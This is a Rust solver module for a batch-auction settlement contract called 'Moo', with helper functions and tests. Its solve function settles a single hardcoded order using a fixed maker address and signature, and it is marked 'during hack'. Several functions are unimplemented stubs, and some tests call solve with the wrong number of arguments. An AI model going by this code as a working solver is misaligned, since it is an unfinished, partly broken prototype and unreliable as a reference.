mod paraswap_solver;
mod solver_utils;
pub mod zeroex_solver;
use ethabi::{encode, ParamType, Token as EthToken};
use crate::models::batch_auction_model::ApprovalModel;
use crate::models::batch_auction_model::ExecutedOrderModel;
use crate::models::batch_auction_model::InteractionData;
use crate::models::batch_auction_model::OrderModel;
use crate::models::batch_auction_model::SettledBatchAuctionModel;
use crate::models::batch_auction_model::TokenAmount;
use crate::models::batch_auction_model::{BatchAuctionModel, TokenInfoModel};
use crate::models::settlement_contract_data::Order;
use crate::slippage::RelativeSlippage;
use crate::slippage::SlippageCalculator;
use crate::slippage::SlippageContext;
use crate::solve::paraswap_solver::ParaswapSolver;
use crate::token_list::get_buffer_tradable_token_list;
use crate::token_list::BufferTradingTokenList;
use crate::token_list::Token;
use contracts::MooSettlementContract;

use self::paraswap_solver::get_sub_trades_from_paraswap_price_response;
use crate::solve::paraswap_solver::api::Root;
use crate::solve::zeroex_solver::api::SwapQuery;
use crate::solve::zeroex_solver::api::SwapResponse;
use crate::solve::zeroex_solver::ZeroExSolver;
use anyhow::{anyhow, Result};
use futures::future::join_all;
use web3::types::{H160, U256};
use std::collections::BTreeMap;
use std::collections::HashMap;
use std::env;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;
use contracts::ethcontract::Bytes;
use hex::FromHex;
use web3::signing::Key;
use web3::transports::Http;
use web3::Web3;
use crate::interactions::Interaction;
use crate::interactions::settlement_contract::MooSettlementInteraction;

ethcontract::contract!("contracts/artifacts/ERC20.json");

lazy_static! {
    pub static ref THOUSAND: U256 = U256::from_dec_str("1000").unwrap();
}

static ALREADY_EXECUTED: AtomicBool = AtomicBool::new(false);
const FALLBACK_SLIPPAGE: RelativeSlippage = RelativeSlippage(0.001);
// const MOO_SETTLEMENT_CONTRACT_ADDRESS: &str = "0xcEe38fB7D7c6ed6BABc18898BDEF67ED572Cc9D0";
const MOO_SETTLEMENT_CONTRACT_ADDRESS: &str = "0x6d64978ec6Dc0b0175897F1b3F13BB9E6396C7e3";

pub async fn solve(
    BatchAuctionModel {
        mut orders, mut tokens, ..
    }: BatchAuctionModel,
    slippage_calculator: SlippageCalculator,
    web3: Web3<Http>,
) -> Result<SettledBatchAuctionModel> {
    let token_in = H160::from_str("0x6778ac35e1c9aca22a8d7d820577212a89544df9").unwrap();
    let token_out = H160::from_str("0xb4fbf271143f4fbf7b91a5ded31805e42b2208d6").unwrap();
    println!("check");
    if let Some((index, order_model)) = orders.into_iter().find(|(_, order)| order.sell_token == token_in && order.buy_token == token_out) {
        if ALREADY_EXECUTED.swap(true, Ordering::Relaxed) {
            return Ok(Default::default());
        }
        let amount_in = U256::from_str_radix("100000000000000000", 10).unwrap();
        let amount_out = U256::from_str_radix("1000000000000000000", 10).unwrap();

        let ref_token = get_ref_token(&tokens).unwrap();
        println!("in");

        let executed_order = ExecutedOrderModel {
            exec_sell_amount: amount_in,
            exec_buy_amount: amount_out,
            exec_fee_amount: order_model.allow_partial_fill.then_some(100.into()),
        };
        let mut calculated_prices = HashMap::new();
        let decimals = tokens.get(&ref_token).unwrap().decimals.unwrap_or(18);
        let ref_token_price = U256::exp10(decimals as usize);
        calculated_prices.insert(ref_token, ref_token_price);
        calculate_prices_for_order(&order_model, amount_in, amount_out, &mut calculated_prices)?;

        let contract = MooSettlementContract::at(&web3, H160::from_str(MOO_SETTLEMENT_CONTRACT_ADDRESS).unwrap());

        let settlement_contract_order = Order {
            token_in,
            amount_in,
            token_out,
            amount_out,
            valid_to: U256::from(1747179217),
            maker: H160::from_str("d1f5c19d7330F333F28A5CF3F391Bf679aC55841").unwrap(),
            uid: Bytes([1].to_vec()),
        };

        let signature = Vec::from_hex("3bdf1180a463da09ffc18d45937e66767cb76044b85a6108751796c8ab8a01130f5c5dad1d5282a1f5880bbc6ddb8fe194e427523a5ea32ddf1d858a23113ffd1c").unwrap();
        let interaction = MooSettlementInteraction {
            order: settlement_contract_order,
            signature: signature.into(),
            moo: contract,
        }.encode();

        let encoded = interaction.first().unwrap();

        let approval = ApprovalModel {
            token: token_in,
            spender: encoded.0,
            amount: amount_in,
        };
        let interaction_data = InteractionData {
            target: encoded.0, // during hack
            value: U256::zero(),
            call_data: encoded.2.0.clone(),
            exec_plan: Default::default(),
            inputs: vec![TokenAmount {
                amount: amount_in,
                token: order_model.sell_token,
            }],
            outputs: vec![
                TokenAmount {
                    amount: amount_out,
                    token: order_model.buy_token,
                }
            ],
        };

        Ok(
            SettledBatchAuctionModel {
                orders: HashMap::from([(index, executed_order)]),
                amms: Default::default(),
                ref_token: Some(ref_token),
                prices: calculated_prices,
                approvals: vec![approval],
                interaction_data: vec![interaction_data],
            }
        )
    } else {
        Ok(SettledBatchAuctionModel::default())
    }
}

fn get_ref_token(tokens: &BTreeMap<H160, TokenInfoModel>) -> Option<H160> {
    tokens.iter()
        .fold(None, |result: Option<(&H160, &TokenInfoModel)>, current| {
            if let Some(result) = result {
                if current.1.normalize_priority > result.1.normalize_priority {
                    Some(current)
                } else {
                    Some(result)
                }
            } else {
                Some(current)
            }
        })
        .map(|(token_address, _)| token_address)
        .cloned()
}

fn calculate_prices_for_order(order: &OrderModel, sell_amount: U256, buy_amount: U256, prices: &mut HashMap<H160, U256>) -> Result<()>  {
    match (
        prices.get(&order.sell_token),
        prices.get(&order.buy_token),
    ) {
        (Some(price_sell_token), None) => {
            prices.insert(
                order.buy_token,
                price_sell_token
                    .checked_mul(sell_amount)
                    .unwrap()
                    .checked_div(buy_amount)
                    .unwrap(),
            );
        }
        (None, Some(price_buy_token)) => {
            prices.insert(
                order.sell_token,
                price_buy_token
                    .checked_mul(buy_amount)
                    .unwrap()
                    .checked_div(sell_amount)
                    .unwrap(),
            );
        }
        _ => return Err(anyhow!("can't deal with such a ring")),
    }

    Ok(())
}

// Checks that swap respects buy and sell amount because 0x returned buy orders in the
// past which did not respect the queried buy_amount.
pub fn swap_respects_limit_price(swap: &SwapResponse, order: &OrderModel) -> bool {
    // note: This would be different for partially fillable orders but OrderModel does currently not
    // contain the remaining fill amount.
    unimplemented!();
}

fn build_approval(swap: &SwapResponse, query: &SwapQuery) -> ApprovalModel {
    unimplemented!();
}

fn build_payload_for_swap(
    swap: &SwapResponse,
    query: &SwapQuery,
    tokens: &mut BTreeMap<H160, TokenInfoModel>,
    tradable_buffer_token_list: &BufferTradingTokenList,
) -> Result<InteractionData> {
    unimplemented!();
}

fn is_zero_fee_order(order: OrderModel) -> bool {
    order.fee.amount == U256::zero()
}

fn is_market_order(tokens: &BTreeMap<H160, TokenInfoModel>, order: OrderModel) -> Result<bool> {
    // works currently only for sell orders
    let sell_token_price = tokens
        .get(&order.sell_token)
        .ok_or_else(|| anyhow!("sell token price not available"))?
        .external_price
        .ok_or_else(|| anyhow!("sell token price not available"))?;
    let buy_token_price = tokens
        .get(&order.buy_token)
        .ok_or_else(|| anyhow!("buy token price not available"))?
        .external_price
        .ok_or_else(|| anyhow!("buy token price not available"))?;

    Ok((order.is_sell_order
        && (order.sell_amount.as_u128() as f64) * (sell_token_price)
            > (order.buy_amount.as_u128() as f64) * buy_token_price * 0.98f64)
        || (!order.is_sell_order
            && (order.buy_amount.as_u128() as f64) * (buy_token_price)
                < (order.sell_amount.as_u128() as f64) * sell_token_price * 1.02f64))
}

async fn get_swaps_for_orders_from_zeroex(
    orders: Vec<(usize, OrderModel)>,
    slippage_context: &SlippageContext<'_>,
    api_key: Option<String>,
) -> Result<Vec<((usize, OrderModel), (SwapQuery, SwapResponse))>> {
    unimplemented!();
}

async fn get_swaps_for_left_over_amounts(
    updated_traded_amounts: HashMap<(H160, H160), TradeAmount>,
    slippage_context: &SlippageContext<'_>,
    api_key: Option<String>,
) -> Result<Vec<(SwapQuery, SwapResponse)>> {
    unimplemented!();
}

fn swap_tokens_are_tradable_buffer_tokens(
    query: &SwapQuery,
    tradable_buffer_token_list: &BufferTradingTokenList,
) -> bool {
    unimplemented!();
}

#[derive(Clone, Debug)]
pub struct SubTrade {
    pub src_token: H160,
    pub dest_token: H160,
    pub src_amount: U256,
    pub dest_amount: U256,
}
async fn get_paraswap_sub_trades_from_order(
    index: usize,
    paraswap_solver: ParaswapSolver,
    order: &OrderModel,
    tokens: BTreeMap<primitive_types::H160, TokenInfoModel>,
) -> Result<(Vec<(usize, OrderModel)>, Vec<SubTrade>)> {
    // get tokeninfo from ordermodel
    let (price_response, _amount) = match paraswap_solver
        .get_full_price_info_for_order(order, tokens)
        .await
    {
        Ok(response) => response,
        Err(err) => {
            tracing::debug!(
                "Could not get price for order {:?} with error: {:?}",
                order,
                err
            );
            return Err(anyhow!("price estimation failed"));
        }
    };
    if satisfies_limit_price_with_buffer(&price_response, order) {
        Ok((
            vec![(index, order.clone())],
            get_sub_trades_from_paraswap_price_response(price_response.price_route.best_route),
        ))
    } else {
        Ok((Vec::new(), Vec::new()))
    }
}

fn satisfies_limit_price_with_buffer(price_response: &Root, order: &OrderModel) -> bool {
    (price_response.price_route.dest_amount.ge(&order
        .buy_amount
        .checked_mul(THOUSAND.checked_add(U256::one()).unwrap())
        .unwrap()
        .checked_div(*THOUSAND)
        .unwrap())
        && order.is_sell_order)
        || (price_response.price_route.src_amount.le(&order
            .sell_amount
            .checked_mul(THOUSAND.checked_sub(U256::one()).unwrap())
            .unwrap()
            .checked_div(*THOUSAND)
            .unwrap())
            && !order.is_sell_order)
}

fn get_splitted_trade_amounts_from_trading_vec(
    single_trade_results: Vec<SubTrade>,
) -> HashMap<(H160, H160), (U256, U256)> {
    let mut splitted_trade_amounts: HashMap<(H160, H160), (U256, U256)> = HashMap::new();
    for sub_trade in single_trade_results {
        splitted_trade_amounts
            .entry((sub_trade.src_token, sub_trade.dest_token))
            .and_modify(|(in_amounts, out_amounts)| {
                *in_amounts = in_amounts.checked_add(sub_trade.src_amount).unwrap();
                *out_amounts = out_amounts.checked_add(sub_trade.dest_amount).unwrap();
            })
            .or_insert((sub_trade.src_amount, sub_trade.dest_amount));
    }
    splitted_trade_amounts
}

#[derive(Debug, PartialEq)]
struct TradeAmount {
    must_satisfy_limit_price: bool,
    sell_amount: U256,
    buy_amount: U256,
}

fn get_trade_amounts_without_cow_volumes(
    splitted_trade_amounts: &HashMap<(H160, H160), (U256, U256)>,
) -> Result<HashMap<(H160, H160), TradeAmount>> {
    let mut updated_traded_amounts = HashMap::new();
    for (pair, (src_amount, dest_amount)) in splitted_trade_amounts {
        let (src_token, dest_token) = pair;
        if updated_traded_amounts.get(pair).is_some()
            || updated_traded_amounts
                .get(&(*dest_token, *src_token))
                .is_some()
        {
            continue;
        }

        if let Some((opposite_src_amount, opposite_dest_amount)) =
            splitted_trade_amounts.get(&(*dest_token, *src_token))
        {
            if dest_amount > opposite_src_amount {
                updated_traded_amounts.insert(
                    (*dest_token, *src_token),
                    TradeAmount {
                        must_satisfy_limit_price: false,
                        sell_amount: dest_amount - opposite_src_amount,
                        buy_amount: U256::zero(),
                    },
                );
            } else if src_amount > opposite_dest_amount {
                updated_traded_amounts.insert(
                    (*src_token, *dest_token),
                    TradeAmount {
                        must_satisfy_limit_price: false,
                        sell_amount: src_amount - opposite_dest_amount,
                        buy_amount: U256::zero(),
                    },
                );
            } else {
                updated_traded_amounts.insert(
                    (*dest_token, *src_token),
                    TradeAmount {
                        must_satisfy_limit_price: false,
                        sell_amount: opposite_src_amount - dest_amount,
                        buy_amount: U256::zero(),
                    },
                );
            }
        } else {
            updated_traded_amounts.insert(
                (*src_token, *dest_token),
                TradeAmount {
                    must_satisfy_limit_price: false,
                    sell_amount: *src_amount,
                    buy_amount: *dest_amount,
                },
            );
        }
    }
    Ok(updated_traded_amounts)
}

fn contain_cow(splitted_trade_amounts: &[SubTrade]) -> bool {
    let mut pairs = HashMap::new();
    for sub_trade in splitted_trade_amounts {
        let pair = (sub_trade.src_token, sub_trade.dest_token);
        let reverse_pair = (sub_trade.dest_token, sub_trade.src_token);
        if pairs.get(&reverse_pair.clone()).is_some() {
            return true;
        }
        pairs.insert(pair, true);
        // reverse is also added since two trades doing the same is also a cow
        pairs.insert(reverse_pair, true);
    }
    false
}
fn one_token_is_already_in_settlement(
    solution: &SettledBatchAuctionModel,
    swap_info: &(SwapQuery, SwapResponse),
) -> u64 {
    let tokens: Vec<H160> = solution.prices.keys().copied().collect();
    let already_in_settlement =
        tokens.contains(&swap_info.0.sell_token) || tokens.contains(&swap_info.0.buy_token);
    u64::from(already_in_settlement)
}
fn overwrite_eth_with_weth_token(token: H160) -> H160 {
    if token.eq(&"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee".parse().unwrap()) {
        "c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2".parse().unwrap()
    } else {
        token
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::batch_auction_model::CostModel;
    use crate::models::batch_auction_model::ExecutionPlan;
    use crate::models::batch_auction_model::FeeModel;
    use hex_literal::hex;
    use maplit::hashmap;
    use std::collections::BTreeMap;
    use tracing_test::traced_test;

    #[test]
    fn get_splitted_trade_amounts_from_trading_vec_adds_amounts() {
        let sub_trade_1 = SubTrade {
            src_token: "99d8a9c45b2eca8864373a26d1459e3dff1e17f3".parse().unwrap(),
            dest_token: "a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48".parse().unwrap(),
            src_amount: U256::from("1"),
            dest_amount: U256::from("1"),
        };
        let result =
            get_splitted_trade_amounts_from_trading_vec(vec![sub_trade_1.clone(), sub_trade_1]);
        let mut expected_result: HashMap<(H160, H160), (U256, U256)> = HashMap::new();
        expected_result.insert(
            (
                "99d8a9c45b2eca8864373a26d1459e3dff1e17f3".parse().unwrap(),
                "a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48".parse().unwrap(),
            ),
            (U256::from("2"), U256::from("2")),
        );
        assert_eq!(result, expected_result);
    }

    #[test]
    fn test_build_approval() {
        let mim: H160 = "99d8a9c45b2eca8864373a26d1459e3dff1e17f3".parse().unwrap();
        let usdc: H160 = "a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48".parse().unwrap();

        let query = SwapQuery {
            sell_token: mim,
            buy_token: usdc,
            sell_amount: Some(U256::MAX),
            buy_amount: None,
            slippage_percentage: 0.1,
            skip_validation: Some(true),
        };
        let swap = SwapResponse {
            sell_amount: U256::from_dec_str("100").unwrap(),
            buy_amount: U256::from_dec_str("100").unwrap(),
            allowance_target: H160::zero(),
            price: 0f64,
            to: H160::zero(),
            data: vec![0u8].into(),
            value: U256::zero(),
        };
        let approval = build_approval(&swap, &query);
        let expected_approval = ApprovalModel {
            token: query.sell_token,
            spender: swap.allowance_target,
            amount: swap.sell_amount,
        };
        assert_eq!(approval, expected_approval);
    }

    #[test]
    fn test_build_call_data_for_swap() {
        let mim: H160 = "99d8a9c45b2eca8864373a26d1459e3dff1e17f3".parse().unwrap();
        let usdc: H160 = "a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48".parse().unwrap();
        let mut tokens_with_max_buffer = BTreeMap::from_iter(IntoIterator::into_iter([
            (
                mim,
                TokenInfoModel {
                    decimals: Some(18u8),
                    external_price: Some(0.00040788388716066107f64),
                    internal_buffer: Some(U256::max_value()),
                    ..Default::default()
                },
            ),
            (
                usdc,
                TokenInfoModel {
                    decimals: Some(6u8),
                    external_price: Some(405525120.6406718f64),
                    internal_buffer: Some(U256::max_value()),
                    ..Default::default()
                },
            ),
        ]));
        let query = SwapQuery {
            sell_token: mim,
            buy_token: usdc,
            sell_amount: Some(U256::MAX),
            buy_amount: None,
            slippage_percentage: 0.1,
            skip_validation: Some(true),
        };
        let swap = SwapResponse {
            sell_amount: U256::from_dec_str("100").unwrap(),
            buy_amount: U256::from_dec_str("100").unwrap(),
            allowance_target: H160::zero(),
            price: 0f64,
            to: H160::zero(),
            data: vec![0u8].into(),
            value: U256::zero(),
        };

        //Testing internal trades payload if buffers are available and in the allowlist
        let buffer_trading_token_list_with_usdc_and_mim = BufferTradingTokenList {
            tokens: vec![
                Token {
                    address: usdc,
                    chain_id: 1u64,
                },
                Token {
                    address: mim,
                    chain_id: 1u64,
                },
            ],
        };
        let swap_interaction_data = build_payload_for_swap(
            &swap,
            &query,
            &mut tokens_with_max_buffer,
            &buffer_trading_token_list_with_usdc_and_mim,
        )
        .unwrap();
        let expected_swap_interaction_data = InteractionData {
            target: H160::zero(),
            value: U256::zero(),
            call_data: vec![0u8],
            outputs: vec![TokenAmount {
                token: query.buy_token,
                amount: swap.buy_amount,
            }],
            inputs: vec![TokenAmount {
                token: query.sell_token,
                amount: swap.sell_amount,
            }],
            exec_plan: ExecutionPlan {
                coordinates: Default::default(),
                internal: true,
            },
        };
        assert_eq!(swap_interaction_data, expected_swap_interaction_data);

        // Testing non-internal trade with required allowance
        let empty_buffer_trading_token_list = BufferTradingTokenList { tokens: vec![] };
        let swap_interaction_data = build_payload_for_swap(
            &swap,
            &query,
            &mut tokens_with_max_buffer,
            &empty_buffer_trading_token_list,
        )
        .unwrap();
        let expected_swap_interaction_data = InteractionData {
            target: H160::zero(),
            value: U256::zero(),
            call_data: vec![0u8],
            exec_plan: Default::default(),
            outputs: vec![TokenAmount {
                token: query.buy_token,
                amount: swap.buy_amount,
            }],
            inputs: vec![TokenAmount {
                token: query.sell_token,
                amount: swap.sell_amount,
            }],
        };
        assert_eq!(swap_interaction_data, expected_swap_interaction_data);

        // Testing that a external trade is received, if the buffer_token list is empty (without required allowance)
        let swap_interaction_data = build_payload_for_swap(
            &swap,
            &query,
            &mut tokens_with_max_buffer,
            &empty_buffer_trading_token_list,
        )
        .unwrap();
        let expected_swap_interaction_data = InteractionData {
            target: H160::zero(),
            value: U256::zero(),
            call_data: vec![0u8],
            exec_plan: Default::default(),
            outputs: vec![TokenAmount {
                token: query.buy_token,
                amount: swap.buy_amount,
            }],
            inputs: vec![TokenAmount {
                token: query.sell_token,
                amount: swap.sell_amount,
            }],
        };
        assert_eq!(swap_interaction_data, expected_swap_interaction_data);

        // Testing that external trade is used, if not sufficient buffer balance is available
        let mut tokens_without_buffer = BTreeMap::from_iter(IntoIterator::into_iter([
            (
                mim,
                TokenInfoModel {
                    decimals: Some(18u8),
                    external_price: Some(0.00040788388716066107f64),
                    internal_buffer: Some(U256::zero()),
                    ..Default::default()
                },
            ),
            (
                usdc,
                TokenInfoModel {
                    decimals: Some(6u8),
                    external_price: Some(405525120.6406718f64),
                    internal_buffer: Some(U256::zero()),
                    ..Default::default()
                },
            ),
        ]));
        let swap_interaction_data = build_payload_for_swap(
            &swap,
            &query,
            &mut tokens_without_buffer,
            &buffer_trading_token_list_with_usdc_and_mim,
        )
        .unwrap();
        let expected_swap_interaction_data = InteractionData {
            target: H160::zero(),
            value: U256::zero(),
            call_data: vec![0u8],
            exec_plan: Default::default(),
            outputs: vec![TokenAmount {
                token: query.buy_token,
                amount: swap.buy_amount,
            }],
            inputs: vec![TokenAmount {
                token: query.sell_token,
                amount: swap.sell_amount,
            }],
        };
        assert_eq!(swap_interaction_data, expected_swap_interaction_data);
    }

    #[test]
    fn check_for_market_order_with_different_decimal() {
        let mim: H160 = "99d8a9c45b2eca8864373a26d1459e3dff1e17f3".parse().unwrap();
        let usdc: H160 = "a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48".parse().unwrap();
        let mim_usdc_sell_order = OrderModel {
            sell_token: mim,
            buy_token: usdc,
            sell_amount: 85670806275371642755219456u128.into(),
            buy_amount: 85593297939394u128.into(),
            is_sell_order: true,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0u32),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0u32),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
        let tokens = BTreeMap::from_iter(IntoIterator::into_iter([
            (
                mim,
                TokenInfoModel {
                    decimals: Some(18u8),
                    external_price: Some(0.00040788388716066107f64),
                    ..Default::default()
                },
            ),
            (
                usdc,
                TokenInfoModel {
                    decimals: Some(6u8),
                    external_price: Some(405525120.6406718f64),
                    ..Default::default()
                },
            ),
        ]));
        assert!(is_market_order(&tokens, mim_usdc_sell_order).unwrap());
    }

    #[test]
    fn check_for_market_order() {
        let dai: H160 = "4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b".parse().unwrap();
        let usdc: H160 = "d533a949740bb3306d119cc777fa900ba034cd52".parse().unwrap();

        let dai_usdc_sell_order = OrderModel {
            sell_token: dai,
            buy_token: usdc,
            sell_amount: 1_001_000_000_000_000_000u128.into(),
            buy_amount: 1_000_000u128.into(),
            is_sell_order: true,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
        let dai_usdc_buy_order = OrderModel {
            sell_token: dai,
            buy_token: usdc,
            sell_amount: 1_001_000_000_000_000_000u128.into(),
            buy_amount: 1_000_000u128.into(),
            is_sell_order: false,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
        let tokens = BTreeMap::from_iter(IntoIterator::into_iter([
            (
                dai,
                TokenInfoModel {
                    decimals: Some(18u8),
                    external_price: Some(1.00f64),
                    ..Default::default()
                },
            ),
            (
                usdc,
                TokenInfoModel {
                    decimals: Some(6u8),
                    external_price: Some(1000000000000.0f64),
                    ..Default::default()
                },
            ),
        ]));
        assert!(is_market_order(&tokens, dai_usdc_sell_order.clone()).unwrap());
        assert!(is_market_order(&tokens, dai_usdc_buy_order.clone()).unwrap());

        let tokens = BTreeMap::from_iter(IntoIterator::into_iter([
            (
                dai,
                TokenInfoModel {
                    decimals: Some(18u8),
                    external_price: Some(1.00f64),
                    ..Default::default()
                },
            ),
            (
                usdc,
                TokenInfoModel {
                    decimals: Some(6u8),
                    external_price: Some(1030000000000.0f64),
                    ..Default::default()
                },
            ),
        ]));
        assert!(!is_market_order(&tokens, dai_usdc_sell_order).unwrap());
        assert!(!is_market_order(&tokens, dai_usdc_buy_order).unwrap());
        let weth: H160 = "4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b".parse().unwrap();
        let usdc_weth_order = OrderModel {
            sell_token: usdc,
            buy_token: weth,
            sell_amount: 4_002_000_000u128.into(),
            buy_amount: 1_000_000_000_000_000_000u128.into(),
            is_sell_order: true,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
        let tokens = BTreeMap::from_iter(IntoIterator::into_iter([
            (
                weth,
                TokenInfoModel {
                    decimals: Some(18u8),
                    external_price: Some(1.00f64),
                    ..Default::default()
                },
            ),
            (
                usdc,
                TokenInfoModel {
                    decimals: Some(6u8),
                    external_price: Some(400000000.0f64),
                    ..Default::default()
                },
            ),
        ]));
        assert!(is_market_order(&tokens, usdc_weth_order).unwrap());
    }

    #[tokio::test]
    #[traced_test]
    #[ignore]
    async fn solve_three_similar_orders() {
        let dai: H160 = "4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b".parse().unwrap();
        let gno: H160 = "d533a949740bb3306d119cc777fa900ba034cd52".parse().unwrap();

        let dai_gno_order = OrderModel {
            sell_token: dai,
            buy_token: gno,
            sell_amount: 199181260940948221184u128.into(),
            buy_amount: 1416179064540059329552u128.into(),
            is_sell_order: true,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };

        let solution = solve(
            BatchAuctionModel {
                tokens: BTreeMap::from_iter(IntoIterator::into_iter([
                    (
                        dai,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                    (
                        gno,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                ])),
                orders: BTreeMap::from_iter(IntoIterator::into_iter([
                    (1, dai_gno_order.clone()),
                    (2, dai_gno_order.clone()),
                    (3, dai_gno_order),
                ])),
                ..Default::default()
            },
            SlippageCalculator::default(),
        )
        .await
        .unwrap();

        println!("{:#?}", solution);
    }

    #[tokio::test]
    #[traced_test]
    #[ignore]
    async fn solve_with_dai_gno_weth_order() {
        let dai: H160 = "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap();
        let gno: H160 = "6810e776880c02933d47db1b9fc05908e5386b96".parse().unwrap();
        let weth: H160 = "c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2".parse().unwrap();

        let dai_gno_order = OrderModel {
            sell_token: dai,
            buy_token: gno,
            sell_amount: 200_000_000_000_000_000_000_000u128.into(),
            buy_amount: 1u128.into(),
            is_sell_order: true,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };

        let gno_weth_order = OrderModel {
            sell_token: gno,
            buy_token: weth,
            sell_amount: 100_000_000_000_000_000_000u128.into(),
            buy_amount: 1u128.into(),
            is_sell_order: true,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
        let solution = solve(
            BatchAuctionModel {
                tokens: BTreeMap::from_iter(IntoIterator::into_iter([
                    (
                        dai,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                    (
                        gno,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                    (
                        weth,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                ])),
                orders: BTreeMap::from_iter(IntoIterator::into_iter([
                    (1, gno_weth_order),
                    (2, dai_gno_order),
                ])),
                ..Default::default()
            },
            SlippageCalculator::default(),
        )
        .await
        .unwrap();

        println!("{:#?}", solution);
    }

    #[tokio::test]
    #[traced_test]
    #[ignore]
    async fn solve_bal_gno_weth_cows() {
        // let http = Http::new("https://staging-openethereum.mainnet.gnosisdev.com").unwrap();
        // let web3 = Web3::new(http);
        let dai: H160 = "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap();
        let bal: H160 = "ba100000625a3754423978a60c9317c58a424e3d".parse().unwrap();
        let gno: H160 = "6810e776880c02933d47db1b9fc05908e5386b96".parse().unwrap();

        let dai_gno_order = OrderModel {
            sell_token: dai,
            buy_token: gno,
            sell_amount: 15_000_000_000_000_000_000_000u128.into(),
            buy_amount: 1u128.into(),
            is_sell_order: true,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
        let bal_dai_order = OrderModel {
            sell_token: gno,
            buy_token: bal,
            sell_amount: 1_000_000_000_000_000_000_000u128.into(),
            buy_amount: 1u128.into(),
            is_sell_order: true,
            allow_partial_fill: false,
            is_liquidity_order: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
        let solution = solve(
            BatchAuctionModel {
                tokens: BTreeMap::from_iter(IntoIterator::into_iter([
                    (
                        dai,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                    (
                        gno,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                    (
                        bal,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                ])),
                orders: BTreeMap::from_iter(IntoIterator::into_iter([
                    (1, bal_dai_order),
                    (2, dai_gno_order),
                ])),
                ..Default::default()
            },
            SlippageCalculator::default(),
        )
        .await
        .unwrap();

        println!("{:#?}", solution);
    }
    #[tokio::test]
    #[traced_test]
    #[ignore]
    async fn solve_two_orders_into_same_direction() {
        let free: H160 = "4cd0c43b0d53bc318cc5342b77eb6f124e47f526".parse().unwrap();
        let weth: H160 = "c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2".parse().unwrap();

        let free_weth_order = OrderModel {
            sell_token: free,
            buy_token: weth,
            sell_amount: 1_975_836_594_684_055_780_624_887u128.into(),
            buy_amount: 1_000_000_000_000_000_000u128.into(),
            is_sell_order: false,
            is_liquidity_order: false,
            allow_partial_fill: false,
            cost: CostModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
            fee: FeeModel {
                amount: U256::from(0),
                token: "6b175474e89094c44da98b954eedeac495271d0f".parse().unwrap(),
            },
        };
